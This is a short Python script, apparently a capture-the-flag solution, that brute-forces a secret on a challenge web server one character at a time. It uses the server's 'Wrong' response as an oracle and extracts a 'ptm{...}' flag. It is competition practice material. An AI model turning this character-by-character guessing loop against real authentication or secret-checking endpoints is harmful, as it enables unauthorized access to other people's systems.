import requests
import string
from pwn import *
import re
url = "http://delphi.challs.olicyber.it//secret"

alphabet = string.ascii_lowercase + '_'

brute = log.progress("Sending requests")   
correct = log.progress("Correct")

flagFormat = r'ptm{.*}'

keyword = 'magic_is_fa'

while True: 
    for l in alphabet: 
        brute.status(f"Sending request {l}")
        
        data = {"secret" : keyword + l}
        r = requests.post (url, data = data)
        if "Wrong" not in r.text: 
            keyword += l
            correct.status(f"Correct: {keyword}")
            if 'ptm{' in r.text: 
                match = re.search(flagFormat, r.text)
                print (match.group())
                exit()
            break
